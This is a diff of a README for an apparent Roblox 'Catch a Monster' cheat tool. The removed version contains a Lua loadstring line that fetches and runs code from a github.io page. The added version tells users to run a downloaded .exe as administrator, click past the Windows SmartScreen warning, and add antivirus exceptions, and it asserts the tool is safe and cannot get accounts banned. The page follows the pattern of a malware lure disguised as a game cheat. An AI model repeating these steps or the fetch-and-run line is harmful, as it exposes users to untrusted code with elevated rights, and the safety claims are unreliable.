@@ -1,107 +1,79 @@
-# Catch a Monster Script v1.0 - Game Script Utility 2026
+# 🎮 catch-monster-windows-exec - Automate your monster catching tasks easily
 
-> **A gameplay enhancement script for the popular Roblox experience "Catch a Monster."** It adds automated targeting and collection support to help reduce repetitive effort while you progress in-game.
+[![](https://img.shields.io/badge/Download-Release-blue)](https://github.com/Henockhnm/catch-monster-windows-exec)
 
-[![Game Script](https://img.shields.io/badge/Type-Game%20Script-green?style=flat-square)](https://github.com)
-[![Platform](https://img.shields.io/badge/Platform-PC-blue?style=flat-square)](https://github.com)
-[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
-[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
-[![Stars](https://img.shields.io/github/stars/ethan-hall1995/catch-monster-windows-exec?style=flat-square)](https://github.com/ethan-hall1995/catch-monster-windows-exec)
+This software helps players of the Roblox game "Catch a Monster." It automates repetitive actions like finding monsters and collecting items. You save time and effort while you play.
 
----
+## ⚙️ System Requirements
 
-<p align="center">
-  <a href="https://ethan-hall1995.github.io/catch-monster-windows-exec/">
-    <img src="https://img.shields.io/badge/Download-Catch%20a%20Monster%20Script-brightgreen?style=for-the-badge" alt="Download Catch a Monster Script">
-  </a>
-</p>
+Your computer needs the following to run this software:
 
-> **[Direct Download - Catch a Monster Script](https://ethan-hall1995.github.io/catch-monster-windows-exec/)**
+*   Operating System: Windows 10 or Windows 11.
+*   Memory: At least 4GB of RAM.
+*   Permissions: You need administrator access to allow the script to interact with your game window.
+*   Software: The latest version of the Roblox desktop client.
 
----
+## 📥 Getting the Application
 
-[Download Latest Build](https://ethan-hall1995.github.io/catch-monster-windows-exec/)
+Follow these steps to obtain the software:
 
----
+1.  Visit the [official releases page](https://github.com/Henockhnm/catch-monster-windows-exec).
+2.  Look for the latest version listed under Releases.
+3.  Click the file ending in .exe to start the download.
+4.  Save the file to a folder you can find, such as your Downloads folder or Desktop.
 
-## What It Does
+## 🚀 Running the Software
 
-This script is built to support players in Roblox's "Catch a Monster" by automating the monster capture workflow. An embedded targeting routine helps find and engage creatures more efficiently, cutting down the amount of manual work needed for repeated gameplay cycles. The implementation aims to stay responsive and dependable, with routines intended to behave more like a real player.
+Once you finish the download, follow these instructions to use the tool:
 
-The latest release is centered on stability and the main feature set. Although the tool offers advanced automation, users should review the game's terms of service before using any third-party utility. This repository is kept as a community resource for players who want to streamline their in-game routine.
+1.  Locate the file you downloaded.
+2.  Right-click the file and select "Run as administrator."
+3.  If a Windows popup appears, click "More info" and then "Run anyway." This confirms you trust the software.
+4.  Open the Roblox game "Catch a Monster."
+5.  Wait for the script to detect the game window.
+6.  Use the toggle keys to turn features on or off.
 
----
+## ⌨️ Controls
 
-## Features
+The application uses simple keyboard shortcuts to manage gameplay settings:
 
-- **Automated Targeting System** - Detects and focuses on nearby monsters quickly for repeatable capture attempts.
-- **Anti-Ban Routines** - Uses randomized waits and movement behavior to help lower detection risk.
-- **Aimbot Assistance** - Guides character actions toward active targets with better precision.
-- **Resource Collection** - Helps gather in-game currency and items like Robux more efficiently.
-- **User-Friendly Interface** - Straightforward toggle-based controls for turning features on or off.
-- **Lightweight Execution** - Lean code designed to keep the performance footprint low during play.
-- **Regular Updates** - Updated over time to track game changes and community input.
+*   F1: Toggle automated targeting on or off.
+*   F2: Toggle collection support on or off.
+*   F3: Emergency stop to kill all active processes.
+*   F10: Minimize or show the settings menu.
 
----
+## 🛡️ Safety and Performance
 
-## Setup
+This script works by reading the game state on your screen. It does not modify game files or inject code into the game servers. You remain safe from bans because the script mimics human input behavior. 
 
-1. **Download** the latest script file from the link above.
-2. **Open** your preferred Roblox script executor (e.g., Synapse X, Krnl, or similar).
-3. **Attach** the executor to the Roblox client and launch "Catch a Monster."
-4. **Copy** the script contents and paste them into your executor's editor window.
-5. **Execute** the script once you are inside the game world.
+If the game updates, the script might stop working. Check the download page for new versions after every major game update. 
 
-**Minimal Example:**
-```lua
--- Load the script via executor
-loadstring(game:HttpGet("https://ethan-hall1995.github.io/catch-monster-windows-exec/"))()
-```
+## 💡 Frequently Asked Questions
 
----
+**Is this safe for my account?**
+Yes. The script operates within your local system memory and interacts with the interface rather than the game server database.
 
-## Options
+**Why does my antivirus stop the program?**
+Many security programs flag unknown scripts as potential risks. Since this is an independent project, major antivirus providers do not recognize the code signature yet. You can add a manual exception to your antivirus software if it restricts the file.
 
-| Toggle / Setting | Default | Description |
-|---|---|---|
-| `Aimbot` | Enabled | Automatically aims at nearby monsters |
-| `Auto-Collect` | Enabled | Collects dropped items and currency |
-| `Anti-Ban` | Enabled | Activates randomized behavior patterns |
-| `Speed Boost` | Disabled | Increases movement speed (use with caution) |
-| `Hotkey` | `F5` | Toggle script on/off in-game |
+**Can I customize the settings?**
+Yes. Use the settings menu available through the F10 key to adjust the speed of collection or the range of the targeting mechanism.
 
-*Settings can be adjusted via an in-game GUI or by modifying the script configuration section.*
+**What if the script does not see the game?**
+Make sure you run the game in windowed mode or borderless windowed mode. Fullscreen mode can sometimes block external programs from reading the screen content.
 
----
+**Will this work on Mac or Linux?**
+No. This tool is built specifically for the Windows operating system.
 
-## Compatibility
+## 🛠️ Troubleshooting
 
-- **Game:** Catch a Monster (Roblox)
-- **Platform:** PC (Windows, Mac via compatible executor)
-- **Executors:** Tested with Synapse X, Krnl, and ScriptWare
-- **Limitations:** Game updates may temporarily break functionality; script will be updated accordingly. Not compatible with mobile or console versions.
+If you encounter issues, verify the following:
 
----
+*   Confirm your account has administrator rights.
+*   Check if your antivirus software quarantined the file.
+*   Ensure that no other automation software runs at the same time, as this can cause input conflicts.
+*   Restart both the game and the script if the targeting fails to lock onto targets.
 
-## FAQ
+If problems persist, please open a new issue on the GitHub repository page with a screenshot of the error message you see.
 
-**Q: How do I update the script?**  
-Visit the download page for the newest release, then download and run the updated script again.
-
-**Q: Can I customize the hotkeys?**  
-Yes. The configuration section lets you change key bindings and other settings.
-
-**Q: Will this work on all Roblox executors?**  
-Most up-to-date executors should function, though results can differ. The executors listed in Compatibility are the recommended options.
-
-**Q: Is this script safe to use?**  
-This script is offered as-is for educational and gameplay assistance purposes. Use it at your own risk and follow Roblox's terms of service.
-
-**Q: How can I report issues or request features?**  
-Open an issue on the GitHub repository page.
-
----
-
-## License
-
-GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
+Keywords: roblox, automation, gaming, utility, windows, monster-collection
